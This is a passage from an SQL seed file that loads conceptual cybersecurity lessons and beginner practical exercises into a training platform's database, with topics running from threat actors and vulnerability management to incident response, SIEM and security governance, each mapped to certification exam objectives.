**Authentication** verifies identity; **authorization** determines what an authenticated user can do. **Access control models** include DAC (discretionary), MAC (mandatory), and RBAC (role-based). **Federation** and **SSO** allow single sign-on across systems. **MFA** and **privileged access management** reduce the risk of credential compromise. They are central to securing enterprises.

## Exam alignment

Security+ 1.3–1.4 (Identity, access); ISC² CC Access Control Concepts.
$md$, 25, 2),
  ('b0000000-0000-4000-8000-000000000032', 'Threat Actors and Attack Types', 'Who attacks and how: malware, phishing, and exploits.', $md$
# Threat Actors and Attack Types

## Introduction

This lesson introduces who carries out attacks (threat actors), common attack types (malware, phishing, exploits, DDoS, insiders), and how organisations mitigate them through vulnerability management and user awareness.

## Objectives

By the end of this lesson you will be able to:

- Describe categories of threat actors and their typical motives and capabilities.
- Define malware types (ransomware, trojans, rootkits) and how they spread.
- Explain phishing and social engineering and how to mitigate them.
- Summarise exploits, DDoS, and insider threats and relevant controls.

## Threat Actors

Threat actors range from **script kiddies** (low skill, using others’ tools) to **organised crime** (financial gain), **hacktivists** (ideological), **nation-states** (espionage, disruption), and **insiders** (employees or partners with access). Motives include money, data theft, disruption, and reputation damage. Understanding who might target your organisation helps prioritise defences.

## Malware and Attack Types

**Malware** includes **viruses** (spread by infecting files), **worms** (self-propagating), **trojans** (disguised as legitimate software), **ransomware** (encrypts data and demands payment), and **rootkits** (persist and hide). **Phishing** uses email or other channels to trick users into revealing credentials or installing malware. **Social engineering** manipulates people into breaking security (e.g. pretexting, baiting). **Exploits** use software or configuration weaknesses to gain access or cause harm. **DDoS (Distributed Denial of Service)** floods a target with traffic to make it unavailable. **Insider threats** are people who misuse legitimate access (malicious or negligent).

## Mitigations

**Vulnerability management** — Discover (scanning), prioritise (risk and exposure), and remediate (patch or mitigate) vulnerabilities. **User awareness** — Training and phishing simulations so users recognise and report threats. **Defence in depth** — Multiple controls so one failure does not mean full compromise.

## Key takeaway

Threat actors vary by motive and capability. Malware, phishing, social engineering, exploits, DDoS, and insiders are common attack types. Vulnerability management and user awareness are core mitigations.

## Exam alignment

Security+ 2.1–2.2 (Threats, attacks); ISC² CC Security Operations.
$md$, 28, 1),
  ('b0000000-0000-4000-8000-000000000032', 'Vulnerability Assessment and Response', 'Scanning, prioritisation, and incident response basics.', $md$
# Vulnerability Assessment and Response

## Introduction

This lesson covers how organisations find and prioritise vulnerabilities (scanning, penetration testing) and how they respond to incidents. You will learn the vulnerability management process and the main phases of incident response.

## Objectives

By the end of this lesson you will be able to:

- Explain vulnerability scanning and how it differs from penetration testing.
- Describe how to prioritise remediation using severity and exposure.
- List and describe the phases of incident response.
- Explain why preparation and documentation matter for response.

## Vulnerability Scanning and Penetration Testing

**Vulnerability scanning** uses tools to compare systems and software against known weaknesses (e.g. missing patches, misconfigurations). Scans are typically automated and recurring. **Penetration testing** simulates an attacker: testers attempt to exploit findings to confirm impact and chain vulnerabilities. It is done with explicit authorisation and scope. Both feed into **prioritisation**: consider severity (e.g. CVSS), whether the asset is internet-facing, exploitability, and business criticality. Not every high-severity finding is urgent if the system is isolated or non-critical.

## Incident Response

**Incident response** is the process of handling security events. Common phases:

- **Preparation** — Plans, runbooks, contacts, and tools in place before an incident.
- **Detection and analysis** — Identifying and validating that an incident has occurred.
- **Containment** — Limiting damage (e.g. isolate systems, disable accounts).
- **Eradication** — Removing the cause (e.g. malware, attacker access).
- **Recovery** — Restoring systems and validating they are secure.
- **Post-incident** — Documentation, lessons learned, and process improvement.

Communication and clear roles (e.g. incident commander) are essential. Backups and disaster recovery procedures support recovery and business continuity.

## Key takeaway

Vulnerability scanning and penetration testing find and validate weaknesses; prioritisation uses severity and context. Incident response follows preparation, detection, containment, eradication, recovery, and post-incident review.

## Exam alignment

Security+ 2.3, 4.x (Vulnerability management, IR); ISC² CC BC/DR, Security Operations.
$md$, 25, 2),
  ('b0000000-0000-4000-8000-000000000033', 'Security Architecture and Resilience', 'Secure design, zero trust, and resilience.', $md$
# Security Architecture and Resilience

## Introduction

This lesson covers how to design secure networks and systems: segmentation, defence in depth, zero trust, and resilience. You will learn principles that apply to on-premises, cloud, and hybrid environments.

## Objectives

By the end of this lesson you will be able to:

- Explain security architecture concepts: segmentation, defence in depth, and secure design.
- Define zero trust and how it differs from perimeter-based security.
- Describe resilience: redundancy, backups, and recovery.
- Summarise how these concepts apply in cloud and hybrid environments.

## Security Architecture

**Security architecture** is the design of systems and networks with security built in. **Network segmentation** divides the network into zones (e.g. DMZ, internal, management) and restricts traffic between them so a breach in one zone does not automatically compromise everything. **Defence in depth** uses multiple layers of controls (network, host, application, data) so that if one control fails, others can still limit damage. **Secure design principles** include least privilege, fail secure, and avoiding security through obscurity.

## Zero Trust

**Zero trust** assumes no implicit trust based on location or network. Every access request is verified regardless of where it comes from. Identity, device posture, and context (e.g. time, resource) are used to grant or deny access. Zero trust reduces reliance on the traditional network perimeter and supports remote work and cloud.

## Resilience

**Resilience** means the organisation can continue or recover after disruption. It includes **redundancy** (duplicate systems or paths), **backups** (regular, tested, offline or immutable where appropriate), and **recovery procedures** (documented, practised). **Business continuity** and **disaster recovery** plans define how critical functions are restored.

## Cloud and Hybrid

In **cloud** and **hybrid** environments, segmentation and identity-centric controls (e.g. zero trust) apply across on-premises and cloud. Shared responsibility models define what the provider secures versus what the customer must secure. Architecture choices (e.g. network design, encryption, access control) should be consistent across environments.

## Key takeaway

Security architecture uses segmentation and defence in depth. Zero trust verifies every access. Resilience relies on redundancy, backups, and recovery. These principles apply in on-premises, cloud, and hybrid environments.

## Exam alignment

Security+ 3.0 (Security Architecture); ISC² CC Security Principles.
$md$, 26, 1),
  ('b0000000-0000-4000-8000-000000000033', 'Monitoring and Security Operations', 'Logging, SIEM, and operational security.', $md$
# Monitoring and Security Operations

## Introduction

This lesson covers how organisations gain visibility into their systems through logging and monitoring, how a SIEM supports detection and response, and what day-to-day security operations involve.

## Objectives

By the end of this lesson you will be able to:

- Explain why logging and monitoring are essential for security.
- Describe what a SIEM does and how it supports detection.
- List typical security operations activities: alert triage, incident handling, runbooks.
- Explain how operational hygiene (e.g. tuning, retention) supports effectiveness.

## Logging and Monitoring

**Logging** records events from systems, applications, and network devices (e.g. logins, errors, configuration changes). **Monitoring** uses those logs and metrics to observe behaviour and spot anomalies. Logs must be protected from tampering and retained according to policy. Centralised collection makes analysis and retention easier.

## SIEM

A **SIEM (Security Information and Event Management)** aggregates logs from many sources, normalises them, and supports **detection** (rules and analytics to find suspicious activity), **investigation** (search and correlation), and **reporting**. SIEMs help analysts triage alerts, investigate incidents, and meet compliance requirements. Effective use depends on quality data sources, tuned rules to limit false positives, and clear runbooks for common scenarios.

## Security Operations

**Security operations** include monitoring dashboards and queues, **triaging** alerts (deciding what is real and what is priority), **responding** to incidents (containment, escalation), and maintaining **runbooks** and playbooks. Operations teams also maintain and tune controls (e.g. firewall rules, detection rules) and participate in exercises and tabletop drills.

## Key takeaway

Logging and monitoring provide visibility; a SIEM aggregates and analyses logs for detection and investigation. Security operations centre on triage, response, runbooks, and continuous tuning.

## Exam alignment

Security+ 4.1–4.3 (Security Operations); ISC² CC Security Operations.
$md$, 24, 2),
  ('b0000000-0000-4000-8000-000000000031', 'Cryptography in Practice', 'Symmetric, asymmetric, TLS, and certificates in the real world.', $md$
# Cryptography in Practice

## Introduction

This lesson applies cryptography to real-world use: how TLS secures web and API traffic, how certificates and PKI establish trust, and how symmetric and asymmetric encryption are used together.

## Objectives

By the end of this lesson you will be able to:

- Describe how TLS uses asymmetric key exchange and symmetric bulk encryption.
- Explain what certificates and CAs are and how they support trust.
- Identify where encryption at rest and in transit apply (e.g. disk, database, TLS).
- Troubleshoot common certificate and TLS issues (expiry, chain, hostname).

## Symmetric and Asymmetric in Practice

**Symmetric encryption** (e.g. AES) uses one shared key; it is fast and used for bulk data. **Asymmetric** (e.g. RSA, ECC) uses public/private key pairs; the public key can be shared, the private key is kept secret. **TLS** uses asymmetric cryptography to authenticate the server (and optionally the client) and to exchange a symmetric session key; the rest of the session uses symmetric encryption for performance. You will see TLS in HTTPS, VPNs, email (TLS for transport), and many APIs.

## Certificates and PKI

**Certificates** bind a public key to an identity (e.g. domain name, organisation). A **Certificate Authority (CA)** signs certificates; clients trust CAs (via a root store) and thus trust certificates signed by them. **PKI (Public Key Infrastructure)** is the set of policies, CAs, and procedures for issuing and revoking certificates. Common issues: expired certificates, broken chain (intermediate not trusted), hostname mismatch. Best practice: automate renewal (e.g. Let''s Encrypt) and monitor expiry.

## Encryption at Rest and in Transit

**In transit** — Data moving over the network should be encrypted (e.g. TLS). **At rest** — Data on disk or in databases should be encrypted (e.g. full-disk encryption, database encryption, encrypted backups). Key management (generation, storage, rotation, destruction) is critical; losing keys can mean losing access to data.

## Key takeaway

TLS combines asymmetric key exchange with symmetric bulk encryption. Certificates and PKI establish trust. Encryption at rest and in transit, with proper key management, are baseline for protecting data.

## Exam alignment

Security+ 1.2; ISC² CC Security Principles.
$md$, 26, 3),
  ('b0000000-0000-4000-8000-000000000032', 'Vulnerability Types and Prioritisation', 'CVE, CVSS, and how to prioritise remediation.', $md$
# Vulnerability Types and Prioritisation

## Introduction

This lesson explains how vulnerabilities are named (CVE), how severity is scored (CVSS), and how to prioritise remediation using score, exposure, exploitability, and business context.

## Objectives

By the end of this lesson you will be able to:

- Explain what CVE and CVSS are and how they are used.
- Interpret a CVSS score and its components (e.g. base, temporal, environmental).
- Prioritise remediation using severity, exposure, exploitability, and asset criticality.
- Apply risk-based prioritisation when resources are limited.

## CVE and CVSS

**CVE (Common Vulnerabilities and Exposures)** is a catalogue of known vulnerabilities; each has a unique ID (e.g. CVE-2024-1234). **CVSS (Common Vulnerability Scoring System)** produces a score (0–10) for severity. The **base** score reflects exploitability and impact; **temporal** adjusts for exploit availability and patches; **environmental** adjusts for your environment (e.g. criticality of affected asset). Scores help compare and communicate risk but should not be the only input for prioritisation.

## Prioritisation

Prioritise using:

- **Severity** — CVSS and whether exploit code or active attacks exist.
- **Exposure** — Is the asset internet-facing or in a sensitive segment?
- **Exploitability** — Is there a known exploit? Is the software widely deployed?
- **Asset criticality** — How important is the system to the business?

A critical vulnerability on an isolated, non-critical system may be lower priority than a high (not critical) vulnerability on an internet-facing payment system. Document criteria and exceptions so decisions are consistent and auditable.

## Key takeaway

CVE provides standard identifiers; CVSS provides severity scores. Use severity, exposure, exploitability, and asset criticality together to prioritise remediation.

## Exam alignment

Security+ 2.3–2.4.
$md$, 22, 3),
  ('b0000000-0000-4000-8000-000000000033', 'Secure Deployment and Hardening', 'Baselines, hardening, and secure development lifecycle basics.', $md$
# Secure Deployment and Hardening

## Introduction

This lesson covers how to deploy systems securely using security baselines, hardening, and secure development and deployment practices. You will learn how to reduce attack surface and integrate security into the lifecycle.

## Objectives

By the end of this lesson you will be able to:

- Define security baselines and give examples (e.g. CIS Benchmarks).
- List hardening steps for servers and network devices.
- Describe how security fits into the development and deployment lifecycle.
- Explain secure pipelines, dependency checks, and secure coding basics.

## Security Baselines

**Security baselines** are standard secure configurations for operating systems, applications, and devices. **CIS Benchmarks** and vendor guidance (e.g. Microsoft Security Baseline) provide recommended settings. Baselines address default passwords, unnecessary services, logging, encryption, and access control. New systems and major upgrades should be built to the baseline and validated (e.g. scanning, manual checks) before going live.

## Hardening

**Hardening** is the process of reducing attack surface: disable or remove unneeded services and features, restrict permissions (least privilege), apply patches, configure firewalls and access lists, enable logging, and protect management interfaces. Different asset types (web server, database, network device) have different hardening checklists. Hardening should be documented and repeated when images or configurations change.

## Secure SDLC and Deployment

**Secure SDLC** integrates security into design, development, and deployment. Practices include: secure design and threat modelling, secure coding standards and training, **dependency scanning** (known vulnerable libraries), **SAST/DAST** (static and dynamic testing), secure **CI/CD** (pipeline secrets, signed artefacts, approval gates), and post-deployment monitoring. The goal is to find and fix issues early rather than only in production.

## Key takeaway

Baselines and hardening reduce attack surface for deployed systems. A secure lifecycle (design, code, build, deploy) prevents many issues before they reach production.

## Exam alignment

Security+ 3.x, 4.x.
$md$, 25, 3),
  ('b0000000-0000-4000-8000-000000000034', 'Security Policies and Compliance', 'Policies, standards, and compliance.', $md$
# Security Policies and Compliance

## Introduction

This lesson covers how organisations set security expectations (policies, standards, procedures) and how compliance and audits drive and verify control implementation. You will learn the role of policy and how to work effectively with compliance requirements.

## Objectives

By the end of this lesson you will be able to:

- Distinguish policies, standards, and procedures and give examples.
- Explain how compliance frameworks (e.g. GDPR, PCI-DSS) drive controls.
- Describe the role of audits and how to prepare for them.
- Justify technical controls using policy and compliance requirements.

## Policies, Standards, and Procedures

**Policies** are high-level statements of what the organisation expects (e.g. “We protect confidential data”, “Access is based on role and need”). **Standards** define specific requirements (e.g. password length, encryption algorithms). **Procedures** are step-by-step instructions for carrying out tasks (e.g. how to grant access, how to handle an incident). Policies are approved by leadership; standards and procedures support implementation and consistency.

## Compliance

**Compliance** means meeting legal, regulatory, or contractual requirements. Examples: **GDPR** (EU data protection), **HIPAA** (US health data), **PCI-DSS** (payment card data), **SOC 2** (service organisation controls). Frameworks specify control requirements; organisations map their controls to the framework and collect evidence. **Audits** (internal or external) verify that controls are in place and operating effectively. Non-compliance can result in fines, legal action, or loss of trust.

## Working with Policy and Compliance

Security teams implement controls that satisfy policy and compliance. When designing or changing controls, reference the relevant policy and framework requirements so that implementations are traceable. Document how each control maps to a requirement. This supports audits and helps explain to management why certain controls are needed.

## Key takeaway

Policies set expectations; standards and procedures implement them. Compliance frameworks and audits define and verify required controls. Technical controls should be traceable to policy and compliance.

## Exam alignment

Security+ 5.1–5.2; ISC² CC (governance).
$md$, 24, 1),
  ('b0000000-0000-4000-8000-000000000034', 'Security Awareness and Third-Party Risk', 'Training, phishing simulation, and vendor risk.', $md$
# Security Awareness and Third-Party Risk

## Introduction

This lesson covers how to reduce human risk through security awareness and phishing simulations, and how to manage risk from third parties (vendors, partners) that have access to your systems or data.

## Objectives

By the end of this lesson you will be able to:

- Design and deliver effective security awareness training.
- Use phishing simulations to measure and improve behaviour.
- Explain third-party and vendor risk and how to assess and monitor it.
- Describe contracts, assessments, and ongoing monitoring for vendors.

## Security Awareness Training

**Security awareness training** teaches staff to recognise threats (e.g. phishing, social engineering), use strong passwords and MFA, handle data correctly, and report incidents. Training should be role-relevant, regular, and reinforced (e.g. short modules, reminders). Topics often include: phishing, passwords, physical security, clean desk, and incident reporting. Measure completion and, where possible, behaviour change.

## Phishing Simulations

**Phishing simulations** send simulated phishing emails to staff to test whether they click or report. Results show where awareness is weak; follow-up training can target those who need it. Simulations should be authorised, clearly distinguishable from real phishing after the fact (e.g. landing page that says “This was a test”), and used to improve training rather than to punish. Track click rates and report rates over time.

## Third-Party and Vendor Risk

**Third-party risk** is the risk that suppliers, partners, or service providers introduce (e.g. they are compromised, they misuse access, they fail to protect your data). **Vendor management** addresses this through: **due diligence** (assess security before engaging), **contracts** (security and privacy requirements, audit rights, breach notification), **continuous monitoring** (questionnaires, certifications, incident notification), and **termination** (offboarding access and data). Prioritise vendors with access to sensitive systems or data.

## Key takeaway

Awareness training and phishing simulations reduce human error. Third-party risk is managed through due diligence, contracts, and ongoing monitoring. People and partners are part of the security perimeter.

## Exam alignment

Security+ 5.3–5.4; ISC² CC (Security Program).
$md$, 22, 2);

-- ========== LEVEL 3: BH-OPS-2 — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000041', 'a0000000-0000-4000-8000-000000000005', 'Security Operations and Vulnerability Management', 'Operations and vulnerability management for SOC and practitioner roles.', 1),
  ('b0000000-0000-4000-8000-000000000042', 'a0000000-0000-4000-8000-000000000005', 'Incident Response and Recovery', 'IR process and recovery for security operations.', 2);

-- ========== BH-OPS-2: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000041', 'Security Operations and Threat Detection', 'Day-to-day SOC activities and threat detection.', $md$
# Security Operations and Threat Detection

## Introduction

This lesson covers how security operations centres (SOCs) and operations teams monitor, triage, and respond to threats. You will learn how detection works (signatures, behaviour, threat intelligence) and how EDR and XDR extend visibility and response.

## Objectives

By the end of this lesson you will be able to:

- Describe typical security operations activities: monitoring, triage, runbooks.
- Explain threat detection using signatures, behaviour, and threat intelligence.
- Define EDR and XDR and how they support detection and response.
- Apply runbook-based response for common alert types.

## Security Operations Activities

**Security operations** include continuous **monitoring** of dashboards and queues, **triaging** alerts (determining validity and priority), **investigating** incidents (gathering context, correlating events), and **responding** (containment, escalation, documentation). **Runbooks** and playbooks document how to handle common scenarios so that response is consistent and efficient. Shift handover and escalation paths ensure coverage and clarity.

## Threat Detection

**Threat detection** combines **signature-based** detection (known malware, known IOCs), **behaviour-based** detection (anomalies, suspicious patterns), and **threat intelligence** (IOCs, TTPs from external sources). Tuning reduces false positives; context (asset, user, business) improves prioritisation. Detection effectiveness depends on quality data sources (logs, EDR, network) and clear use cases.

## EDR and XDR

**EDR (Endpoint Detection and Response)** provides visibility and response on endpoints: process and file activity, network connections, and the ability to isolate or remediate. **XDR** extends visibility across endpoints, email, identity, and cloud applications so analysts can correlate and respond across domains. Both support investigation and containment; XDR reduces silos and accelerates cross-domain visibility.

## Key takeaway

Security operations centre on monitoring, triage, investigation, and response. Detection uses signatures, behaviour, and threat intelligence. EDR and XDR provide the visibility and response capabilities needed for effective operations.

## Exam alignment

CySA+ 1.0 (Security Operations); SSCP Security Operations, Risk Identification.
$md$, 28, 1),
  ('b0000000-0000-4000-8000-000000000041', 'Vulnerability Management Lifecycle', 'Scanning, prioritisation, and remediation.', $md$
# Vulnerability Management Lifecycle

## Introduction

This lesson covers the full vulnerability management lifecycle: discovery, prioritisation, remediation, and verification. You will learn how to use CVSS and business context to prioritise and how to track remediation to closure.

## Objectives

By the end of this lesson you will be able to:

- List and describe the phases of the vulnerability management lifecycle.
- Use CVSS and organisational context to prioritise remediation.
- Explain remediation options: patch, mitigate, accept, transfer.
- Verify that remediation was effective and document exceptions.

## Lifecycle Phases

The **vulnerability management lifecycle** has four main phases:

- **Discovery** — Identify vulnerabilities via scanning (network, host, application), penetration testing, and threat intelligence. Scope and schedule scans; ensure authorisation.
- **Prioritisation** — Score and rank findings using CVSS, exposure, exploitability, and asset criticality. Focus on the highest risk first when resources are limited.
- **Remediation** — Apply patches, configuration changes, or compensating controls; or formally accept or transfer risk. Assign owners and deadlines; track to completion.
- **Verification** — Rescan or otherwise verify that the vulnerability is resolved. Document any accepted or deferred risk with justification and review dates.

## Prioritisation in Practice

**CVSS** provides a baseline severity; **temporal** and **environmental** modifiers adjust for your context. Combine with: Is the system internet-facing? Is there an exploit? How critical is the asset? **Risk acceptance** should be documented, time-bound, and approved by the right level. **Compensating controls** (e.g. WAF rule, network segmentation) may reduce risk when patching is delayed.

## Key takeaway

Vulnerability management is a continuous cycle: discover, prioritise, remediate, verify. Prioritisation uses severity and business context. Document acceptance and compensating controls.

## Exam alignment

CySA+ 2.0 (Vulnerability Management); SSCP Risk Identification, Monitoring, and Analysis.
$md$, 26, 2),
  ('b0000000-0000-4000-8000-000000000042', 'Incident Response Process', 'Detection, containment, eradication, recovery.', $md$
# Incident Response Process

## Introduction

This lesson walks through the incident response process from preparation through post-incident review. You will learn the phases, roles, and why communication and documentation are essential.

## Objectives

By the end of this lesson you will be able to:

- List and describe the phases of incident response.
- Explain containment strategies: short-term and long-term.
- Distinguish eradication from recovery and when each happens.
- Describe the purpose of post-incident review and lessons learned.

## IR Phases

**Preparation** — Plans, runbooks, contact lists, and tools in place. **Detection and analysis** — Identify and confirm the incident; determine scope and impact. **Containment** — Limit damage (short-term: isolate systems, disable accounts; long-term: apply fixes so the threat cannot return). **Eradication** — Remove the cause (malware, attacker access, misconfiguration). **Recovery** — Restore systems safely; validate integrity and monitor for recurrence. **Post-incident** — Document timeline, root cause, and lessons learned; update plans and controls.

## Containment, Eradication, Recovery

**Containment** choices depend on impact: taking a system offline may stop the attack but affect business; sometimes containment is gradual (e.g. block C2 first, then rebuild). **Eradication** must remove the root cause; rebuilding from known-good images is often part of this. **Recovery** includes restoring from backups if needed, verifying systems are clean, and watching for reinfection or secondary attacks. Communication with stakeholders (internal and, if required, external) is critical throughout.

## Key takeaway

Incident response follows preparation, detection, containment, eradication, recovery, and post-incident review. Containment limits damage; eradication removes the cause; recovery restores operations. Documentation and lessons learned improve future response.

## Exam alignment

CySA+ 3.0 (Incident Response and Management); SSCP Incident Response and Recovery.
$md$, 30, 1),
  ('b0000000-0000-4000-8000-000000000042', 'Reporting and Communication', 'Reporting to stakeholders.', $md$
# Reporting and Communication

## Introduction

This lesson covers how to report technical findings to management and stakeholders and how to communicate clearly during incidents. You will learn what to include in reports and how to tailor messaging for different audiences.

## Objectives

By the end of this lesson you will be able to:

- Write an executive summary that states impact and recommendations clearly.
- Structure technical reports for management and operational audiences.
- Describe communication best practices during incidents (internal and external).
- Explain why reporting and communication are critical for influence and accountability.

## Reporting

**Reporting** turns technical work into actionable information. **Executive summaries** should state the main finding, impact (business and risk), and recommended actions in plain language. **Technical appendices** can contain detail for those who need it. Use consistent metrics and trends (e.g. mean time to detect, number of open findings) so progress is visible. Reports support decision-making and demonstrate the value of security work.

## Communication During Incidents

During **incidents**, communication must be clear, consistent, and timely. **Internal** — Designate a single point or channel for updates; avoid speculation; state what is known, what is being done, and what is needed. **External** — Follow legal and contractual obligations (e.g. breach notification); coordinate with legal and communications. **Stakeholders** — Keep leadership and affected business units informed; set expectations for recovery and next steps.

## Key takeaway

Good reporting translates technical work into decisions and accountability. During incidents, clear and consistent communication (internal and external) is essential for effective response and trust.

## Exam alignment

CySA+ 4.0 (Reporting and Communication); SSCP Security Operations.
$md$, 22, 2);

-- ========== LEVEL 4: BH-SPEC-SOC — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000051', 'a0000000-0000-4000-8000-000000000006', 'Advanced SOC and SIEM', 'SOC and SIEM operations at an advanced level.', 1),
  ('b0000000-0000-4000-8000-000000000052', 'a0000000-0000-4000-8000-000000000006', 'Threat Hunting and Incident Handling', 'Hunting and advanced incident handling.', 2);

-- ========== BH-SPEC-SOC: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000051', 'SIEM Administration and Tuning', 'Configuring and tuning SIEM for detection.', $md$
# SIEM Administration and Tuning

**SIEM** administration includes onboarding data sources, writing and tuning detection rules, and managing false positives. **Microsoft Sentinel** and **Splunk** are common platforms; **KQL** (Kusto Query Language) is used for querying and building detections. You will use these skills daily in an advanced SOC or security engineering role.

## Exam alignment

CySA+ 1.0 (Security Operations — tooling).
$md$, 30, 1),
  ('b0000000-0000-4000-8000-000000000051', 'Defender XDR and Cloud Security', 'Microsoft Defender and cloud workload protection.', $md$
# Defender XDR and Cloud Security

**Microsoft Defender XDR** unifies endpoint, email, identity, and cloud app protection. **Defender for Cloud** secures Azure and hybrid workloads. Multi-cloud and hybrid environments require visibility and response across platforms; this lesson bridges SOC and cloud security.

## Exam alignment

CySA+ 1.0 (Security Operations — XDR, cloud).
$md$, 28, 2),
  ('b0000000-0000-4000-8000-000000000052', 'Threat Hunting Methodologies', 'Proactive hunting for threats.', $md$
# Threat Hunting Methodologies

**Threat hunting** is proactive search for threats that may have evaded detection. It uses hypotheses, data (logs, EDR), and iterative analysis. **Threat intelligence** informs hunting and prioritisation. Effective hunters combine tool fluency with an understanding of adversary behaviour and organisational context.

## Exam alignment

CySA+ 3.0 (Incident Response and Management); threat hunting.
$md$, 28, 1),
  ('b0000000-0000-4000-8000-000000000052', 'Advanced Incident Handling', 'Complex incidents and coordination.', $md$
# Advanced Incident Handling

**Advanced incident handling** deals with persistent threats, ransomware, and coordinated response across teams. **Forensics** (disk, memory, network) support root cause analysis. **Coordination** with IT, legal, and leadership is essential. This prepares you for lead analyst or incident commander responsibilities.

## Exam alignment

CySA+ 3.0 (Incident Response and Management).
$md$, 26, 2);

-- ========== LEVEL 5: BH-ADV — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000061', 'a0000000-0000-4000-8000-000000000007', 'Security and Risk Management', 'Governance, risk, and compliance at a strategic level.', 1),
  ('b0000000-0000-4000-8000-000000000062', 'a0000000-0000-4000-8000-000000000007', 'Security Architecture and Leadership', 'Architecture and program management for security leaders.', 2);

-- ========== BH-ADV: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000061', 'Security Governance and Risk Management', 'Governance, risk, and compliance.', $md$
# Security Governance and Risk Management

**Security governance** aligns security with business objectives and ensures accountability. **Risk management** includes identification, assessment (likelihood and impact), response (accept, mitigate, transfer, avoid), and monitoring. **Compliance** (regulatory, contractual) drives many security programs. Leaders use this to prioritise and justify security investments.

## Exam alignment

CISSP Domain 1 (Security and Risk Management); CISM (Governance, Risk Management).
$md$, 32, 1),
  ('b0000000-0000-4000-8000-000000000061', 'Security Program Development', 'Building and managing the security program.', $md$
# Security Program Development

A **security program** encompasses policies, standards, procedures, awareness training, and control implementation. **Program development** requires stakeholder buy-in, resources, and metrics. **Third-party risk** and **vendor management** are part of the program. This is the mindset of a CISO or security manager.

## Exam alignment

CISM Domain 3 (Information Security Program); CISSP Domain 5 (Security Program Management).
$md$, 30, 2),
  ('b0000000-0000-4000-8000-000000000062', 'Security Architecture and Engineering', 'Design and engineering for security architects.', $md$
# Security Architecture and Engineering

**Security architecture** designs systems and networks with security built in. It considers **secure design principles**, **cryptography**, and **physical security**. Enterprise architecture frameworks support consistent design; security architects align with them. This supports roles such as Security Architect or Lead Engineer.

## Exam alignment

CISSP Domain 3 (Security Architecture and Engineering); TOGAF (security architecture in EA).
$md$, 30, 1),
  ('b0000000-0000-4000-8000-000000000062', 'Leadership and Communication', 'Leading teams and communicating with the board.', $md$
# Leadership and Communication

**Security leaders** set strategy, manage teams, and communicate risk and programme status to the board and executives. **Board reporting** should be concise, risk-focused, and tied to business impact. **Building a team** and **developing talent** are part of the role. This lesson prepares you for CISO or senior management responsibilities.

## Exam alignment

CISM (Program, Incident Management); CISSP (leadership across domains).
$md$, 28, 2);

-- ==================================================================================
-- PRACTICAL CHALLENGE LESSONS — All seed-file courses
-- One practical per module. Each has a scenario, tasks, and model answer.
-- ==================================================================================

-- ========== BRIDGE: PRACTICALS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

-- Module 1: Computer Fundamentals (practical at order 5)
('b0000000-0000-4000-8000-000000000001', 'Practical: Identify Computer Components',
 'Classify components and trace data flow through a computer.',
$md$
# Practical: Identify Computer Components

## Scenario

Your manager asks you to set up a new workstation for an employee. Before ordering parts, she wants you to show that you understand what each part does.

## Tasks

**Task 1 — Classify these components.** For each item, state whether it is **Input**, **Output**, **Processing**, or **Storage**.

| Component | Category |
|-----------|----------|
| Keyboard | ? |
| Monitor | ? |
| CPU | ? |
| SSD (500 GB) | ? |
| RAM (16 GB) | ? |
| Mouse | ? |
| Printer | ? |

**Task 2 — Trace the data flow.** A user opens a Word document saved on the SSD. Describe, in 3–4 sentences, the journey the data takes through the computer until the document appears on screen.

**Task 3 — Choose specifications.** The employee will do graphic design. From the options below, pick the best choice and explain why:
- Option A: 4 GB RAM, 128 GB HDD, integrated graphics
- Option B: 16 GB RAM, 512 GB SSD, dedicated GPU
- Option C: 8 GB RAM, 256 GB SSD, integrated graphics

$md$, 20, 5),

-- Module 2: Basic Networking (practical at order 4)
('b0000000-0000-4000-8000-000000000002', 'Practical: Trace a Network Path',
 'Follow a web request from browser to server and back.',
$md$
# Practical: Trace a Network Path

## Scenario

A colleague asks: "What actually happens when I type www.example.com into my browser?" Walk them through the process.

## Tasks

**Task 1 — Order the steps.** Put these steps in the correct order (1–6):

- [ ] The web server sends the HTML page back to your browser.
- [ ] Your browser sends an HTTP request to the web server's IP address.
- [ ] You type www.example.com and press Enter.
- [ ] Your computer contacts the DNS server to translate the domain name to an IP address.
- [ ] The browser renders the HTML and displays the page on screen.
- [ ] The DNS server responds with the IP address (e.g. 93.184.216.34).

**Task 2 — Identify the devices.** Name at least three network devices or services the traffic passes through between your computer and the web server.

**Task 3 — What could go wrong?** Describe two problems that could prevent the page from loading and what you would check first for each.

$md$, 20, 4),

-- Module 3: Operating Systems (practical at order 4)
('b0000000-0000-4000-8000-000000000003', 'Practical: Compare Operating Systems',
 'Choose the right OS for different workplace scenarios.',
$md$
# Practical: Compare Operating Systems

## Scenario

You work at a small IT consultancy. Three clients ask for your recommendation on which operating system to use.

## Tasks

**Task 1 — Match the OS.** For each client scenario, recommend **Windows**, **macOS**, or **Linux** and explain why in two sentences.

1. A law firm with 50 users who rely on Microsoft Office, Active Directory, and proprietary legal software.
2. A web development startup whose developers use containers, open-source tools, and SSH daily.
3. A video production company that uses Final Cut Pro and the Apple ecosystem.

**Task 2 — File permissions.** On a Linux system, a file has the permissions `-rw-r-----`. Answer:
- Who can read the file?
- Who can write to it?
- Can "others" access it at all?

**Task 3 — Security comparison.** Name one security advantage that Linux has over Windows and one security advantage that Windows has over Linux in a corporate environment.

$md$, 20, 4),

-- Module 4: Professional Communication (practical at order 3)
('b0000000-0000-4000-8000-000000000004', 'Practical: Write a Technical Email',
 'Communicate a security concern to a non-technical audience.',
$md$
# Practical: Write a Technical Email

## Scenario

You are a junior IT support analyst. During a routine check you discover that a company file server has not been backed up for 14 days due to a misconfigured backup job. There is no data loss yet, but if the server fails, 14 days of work could be lost. You need to inform your manager (who is not technical) and request approval to fix the issue urgently.

## Tasks

**Task 1 — Write the email.** Write a professional email (subject line + body, 100–150 words) to your manager explaining:
